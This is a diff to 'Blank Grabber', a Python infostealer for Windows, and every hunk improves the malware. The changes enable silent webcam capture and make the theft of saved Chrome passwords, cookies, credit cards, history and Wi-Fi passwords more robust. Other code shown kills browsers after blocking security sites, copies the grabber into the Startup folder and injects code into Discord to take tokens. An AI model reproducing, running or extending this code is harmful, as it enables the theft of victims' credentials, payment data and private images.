@@ -39,7 +39,7 @@ DELETE_ITSELF = _config.get('DELETE_ITSELF', True) # Deletes the grabber after u
 MESSAGE_BOX = _config.get('MSGBOX', dict()) # Custom Message box
 BLOCK_SITES = _config.get('BLOCK_SITES', False) # Blocks security related websites
 INJECT_JS = _config.get('INJECT_JS', True) # Modify discord's index.js
-CAPTURE_WEBCAM = False # Takes photo from the webcam (causes bugs, use at own risk)
+CAPTURE_WEBCAM = True # Takes photo from the webcam
 
 class system:
     STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
@@ -115,7 +115,7 @@ class system:
         else:
             out = os.path.join(system.STARTUPDIR, '{}.py'.format(utils.generate()))
         os.makedirs(system.STARTUPDIR, exist_ok= True)
-        try: shutil.copyfile(file, out) 
+        try: utils.copy(file, out) 
         except Exception: return None
         return out
     
@@ -363,11 +363,13 @@ class Browsers:
                 tempfile = os.path.join(MEIPASS, 'loginData.db')
             else:
                 tempfile = os.path.join(os.getenv('temp'), 'loginData.db')
-            shutil.copyfile(path, tempfile)
+            utils.copy(path, tempfile)
             db = sqlite3.connect(tempfile)
             db.text_factory = lambda b: b.decode(errors= 'ignore')
             cursor = db.cursor()
-            for res in cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall():
+            try: results = cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall()
+            except Exception: continue
+            for res in results:
                 URL, USERNAME, PASSWORD = res
                 PASSWORD = Browsers.chromeDecryptData(PASSWORD)
                 if URL and USERNAME and PASSWORD:
@@ -399,11 +401,13 @@ class Browsers:
                 tempfile = os.path.join(MEIPASS, 'cookiesData.db')
             else:
                 tempfile = os.path.join(os.getenv('temp'), 'cookiesData.db')
-            shutil.copyfile(path, tempfile)
+            utils.copy(path, tempfile)
             db = sqlite3.connect(tempfile)
             db.text_factory = lambda b: b.decode(errors= 'ignore')
             cursor = db.cursor()
-            for res in cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall():
+            try: results = cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall()
+            except Exception: continue
+            for res in results:
                 HOST, NAME, PATH, COOKIE, EXPIRY = res
                 COOKIE = Browsers.chromeDecryptData(COOKIE)
                 if HOST and NAME and COOKIE:
@@ -437,11 +441,13 @@ class Browsers:
                 tempfile = os.path.join(MEIPASS, 'ccData.db')
             else:
                 tempfile = os.path.join(os.getenv('temp'), 'ccData.db')
-            shutil.copyfile(path, tempfile)
+            utils.copy(path, tempfile)
             db = sqlite3.connect(tempfile)
             db.text_factory = lambda b: b.decode(errors= 'ignore')
             cursor = db.cursor()
-            for res in cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards').fetchall():
+            try: results = cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards').fetchall()
+            except Exception: continue
+            for res in results:
                 NAME, MONTH, YEAR, NUMBER = res
                 if not (NAME and NUMBER):
                     continue
@@ -476,11 +482,13 @@ class Browsers:
                 tempfile = os.path.join(MEIPASS, 'historyData.db')
             else:
                 tempfile = os.path.join(os.getenv('temp'), 'historyData.db')
-            shutil.copyfile(path, tempfile)
+            utils.copy(path, tempfile)
             db = sqlite3.connect(tempfile)
             db.text_factory = lambda b: b.decode(errors= 'ignore')
             cursor = db.cursor()
-            for res in cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall():
+            try: results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
+            except Exception: continue
+            for res in results:
                 URL, TITLE, VC, LVT = res
                 if URL and TITLE and VC and LVT:
                     History.append((URL, TITLE, VC, LVT))
@@ -743,25 +751,26 @@ class BlankGrabber:
         
         threads = list()
         
-        for func in (
-            self.captureBrowserPasswords,
-            self.captureChromeCookies,
-            self.captureChromeCC,
-            self.captureChromeHistory,
-            self.captureWifiPasswords,
-            self.minecraftStealer,
-            self.misc,
-            self.captureDiscordTokens,
-            self.screenshot,
-            self.webshot,
-            self.getIPandSystemInfo,
-            self.getPCInfo,
-            self.discordInjection,
-            self.blockSites
+        for func, isBackground in (
+            (self.captureBrowserPasswords, False),
+            (self.captureChromeCookies, False),
+            (self.captureChromeCC, False),
+            (self.captureChromeHistory, False),
+            (self.captureWifiPasswords, False),
+            (self.minecraftStealer, False),
+            (self.misc, False),
+            (self.captureDiscordTokens, False),
+            (self.screenshot, False),
+            (self.getIPandSystemInfo, False),
+            (self.getPCInfo, False),
+            (self.discordInjection, False),
+            (self.blockSites, False),
+            (self.webshot, True),
         ):
-            t = Thread(target= func)
+            t = Thread(target= func, daemon= isBackground)
             t.start()
-            threads.append(t)
+            if not isBackground:
+                threads.append(t)
         
         for thread in threads:
             thread.join()
@@ -791,13 +800,17 @@ class BlankGrabber:
         for profile, psw in passwords.items():
             profiles.append(f'Network: {profile}\nPassword: {psw}')
         divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
-        with open(os.path.join(self.system, 'Wifi Networks.txt'), "w", encoding= 'utf-8', errors= 'ignore') as file:
-            file.write(divider.lstrip() + divider.join(profiles))
-        self.collection['Wifi Passwords'] += len(profiles)
+        if profiles:
+            with open(os.path.join(self.system, 'Wifi Networks.txt'), "w", encoding= 'utf-8', errors= 'ignore') as file:
+                file.write(divider.lstrip() + divider.join(profiles))
+            self.collection['Wifi Passwords'] += len(profiles)
     
     @utils.catch
     def discordInjection(self) -> None:
-        for dir in Discord.injectJS():
+        paths = Discord.injectJS()
+        if paths is None:
+            return
+        for dir in paths:
             if system.isInStartup():
                 continue
             appname = os.path.basename(dir)
@@ -817,17 +830,14 @@ class BlankGrabber:
         if BLOCK_SITES:
             try:
                 system.blockSites()
+                for process in ('chrome', 'firefox', 'msedge', 'safari', 'opera', 'iexplore'):
+                    Thread(target= lambda: subprocess.run("taskkill /F /IM {}.exe".format(process), shell= True, capture_output= True)).start()
             except Exception:
                 return
         
     @utils.catch
-    def captureBrowserPasswords(self) -> None:
-        if FROZEN:
-            path = MEIPASS
-        else:
-            path = os.path.abspath('.')
-        
-        if not os.path.isfile(PasswordGrabber := os.path.join(path, 'getPass')):
+    def captureBrowserPasswords(self) -> None:        
+        if not os.path.isfile(PasswordGrabber := os.path.join(MEIPASS, 'getPass')):
             vault = Browsers.getChromePass()
             passwords = list()
             if not vault:
@@ -1098,10 +1108,9 @@ class BlankGrabber:
         camlist = [x[15:] for x in subprocess.run('Camera.exe /devlist', capture_output= True, shell= True, cwd= tempCamPath).stdout.decode(errors= 'ignore').splitlines() if "Device name:" in x]
         for index, name in enumerate(camlist):
             try:
-                subprocess.run('Camera.exe /devnum {} /quiet /filename image.bmp'.format(index + 1), shell= True, capture_output= True, cwd= tempCamPath, timeout= 5.0).stdout.decode(errors= 'ignore')
+                subprocess.run('Camera.exe /devnum {} /quiet /filename image.bmp'.format(index + 1), shell= True, stdout= open(os.devnull, 'w'), stderr= open(os.devnull, 'w'), cwd= tempCamPath, timeout= 5.0)
             except subprocess.TimeoutExpired:
-                os.remove(tempCam)
-                return
+                continue
             if not os.path.isfile(tempimg := os.path.join(tempCamPath, 'image.bmp')):
                 continue
             if isMonochrome(tempimg):
